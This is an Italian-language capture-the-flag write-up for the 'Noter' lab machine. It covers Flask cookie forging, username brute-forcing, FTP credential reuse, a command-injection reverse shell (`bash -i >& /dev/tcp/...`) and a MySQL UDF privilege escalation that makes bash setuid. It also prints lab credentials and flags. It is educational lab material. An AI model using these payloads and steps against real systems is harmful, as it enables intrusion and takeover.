# Noter
* **POINTS**: 30
* **USER RATING**: Medium
* **OPERATING SYSTEM**: Linux
* **RATING**: 4.1

## 1. Recon
```console
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 12:54 EDT
Nmap scan report for 10.10.11.160 (10.10.11.160)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.71 seconds
```

### 1.1 Risultati nmap
#
Si nota che esiste un sito che gira su un server python

![site](Images/web.png)

Dopo aver effettuato la registrazione ed il login:

![dentro](Images/dentro.png)

Aggiungiamo una nota

![nota](Images/addnote.png)

Ma la cosa che attira l'attenzione è il session cookie: 
``eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkIn0.YqxyAw.wXovkW8KYcLOT3UYdJXyUxTIxEU``

## 2. Forge new cookie
Il cookie trovato è un Flask Cookie e cercando su Google ho trovato la pagina di [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) nella quale si spiega come è composto e soprattutto descrive un tool per fare encode e decode del cookie.

```console
└─$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkIn0.YqxyAw.wXovkW8KYcLOT3UYdJXyUxTIxEU'
[*] Session decodes to: {'logged_in': True, 'username': 'asd'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 17152 attemptskwanghlm/oau
'secret123'
```

Arrivati a questo punto bisogna capire qual è lo username corretto affinchè si possano avere delle informazioni in più. Per capirlo, ho notato che, nel momento in cui si effettua il login con username corretto e con password errata, il server risponde con *Invalid login*; quindi ho creato un [bruteforce](bruteforce.py) che tiene conto di tale considerazione.

```console
└─$ python3 brute.py
[+] USER FOUND: blue
```

Dopo aver trovato lo username si va a forgiare il nuovo cookie:

```console
└─$ flask-unsign --sign --secret "secret123" --cookie "{'logged_in': True, 'username': 'blue'}"
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yqxgvw.BtypiXqFwCwuppwMwLjszYU90N4
```

Si inserisce il nuovo cookie, si ricarica la pagina e si ha il login come *blue* e si vedono 2 note:

1. 
<p align="center">
  <img src="Images/nota1.png" />
</p>

2. 
<p align="center">
  <img src="Images/nota2.png" />
</p>

## 3. FTP
Nella seconda nota abbiamo le credenziali (`username` : `blue`, `password` : `blue@Noter!`) per il servizio ftp quindi effettuiamo l'accesso e vediamo cosa c'è:

```console
└─$ ftp blue@10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58811|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
```

In *files* non c'è nulla e per leggere *policy.pdf* lo scarichiamo.

Nel PDF c'è esplicitamente scritto come le password vengono create ed in particolare il format che seguono: `username@site_name!`. Ricordando che il messaggio che si legge nella nota 2 viene firmata da `ftp_admin` si tenta l'accesso con le seguenti credenziali: `username` : `ftp_admin`, `password` : `ftp_admin@Noter!`

```console
└─$ ftp ftp_admin@10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41771|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
```

Scaricando i file abbiamo i sorgenti.

## 4. RCE
In `app.py` relativo a `app_backup_1638395546.zip` si denota l'utilizzo di *subprocess* che ci indica il sink della RCE.

```console
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")
```

Come si denota dal codice la condizione affinchè funzioni è che bisogna esportare una nota ed in particolare si deve farlo con la form che permette di inserire un URL.

L'idea quindi è:
- avere una shell (`a'; bash -i >& /dev/tcp/10.10.14.3/9091 0>&1; echo 'a`)
- avere un server python con il quale poter caricare la shell
- inserire come url `http://<mio_ip>:<port>/rev.md`

Dopo aver effettuato tali passaggi si ha la shell ed in "*/home/svc*" si ha la user flag: `d83209479b8d7ae19ad998813daf78dc`

## 5. Boot To Root
In `app.py` relativo a `app_backup_1635803546.zip` si hanno in chiaro le credenziali del DB:

```
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
```

Quindi cercando su Google, come fare privilege escalation attraverso queste info, ho trovato questo [link](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf#:~:text=Functions%20are%20a%20block%20of,tasks%20related%20to%20their%20systems.), nella quale c'è la spiegazione completa del possibile attacco.

### 5.1 POC
#
Verifichiamo dapprima che ci sia un processo in locale sulla porta 3306:

```console
svc@noter:/dev/shm$ netstat -punta
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1262/python3        
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      2 10.10.11.160:40416      10.10.14.3:9091         ESTABLISHED 783494/bash         
tcp        0      0 10.10.11.160:5000       10.10.14.3:39512        ESTABLISHED 1262/python3        
tcp        0      1 10.10.11.160:49296      8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:57757         127.0.0.53:53           ESTABLISHED -
```

Quindi si verifica con che permessi gira

```console
svc@noter:/dev/shm$ systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" 
user=root --skip-log-error --pid-file=/run/mysqld/mysq
```

### 5.2 Exploit
#
Dal link trovato prima si trova anche il link dell'[exploit](https://www.exploit-db.com/exploits/1518) che ho scaricato in locale. Ho eseguito i seguenti comandi:
* gcc -g -c 1518.c
* gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc

Quindi ho passato i file sulla macchina ed ho seguito la guida passo passo per creare correttamente la *UDF function*:
1. Accesso a mysql con le credenziali di cui prima con il comando `mysql -u root -pNildogg36`
2. show variables like '%plugin%';
3. show variables like '%secure_file_priv%';
4. use mysql;
5. create table foo(line blob);
6. insert into foo values(load_file('/dev/shm/1518.so'));
7. select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/1518.so';
8. create function do_system returns integer soname '1518.so';
9. select * from mysql.func;
10. select do_system('chmod 4777 /bin/bash');
11. exit;

Dopo di che eseguendo il comando `bash -p` ho la shell root !

````console
svc@noter:/dev/shm$ bash -p
bash-5.0#
````

Infine in */root* c'è la root flag: `7bef9a538d3e90f83fa9439a99cbc178`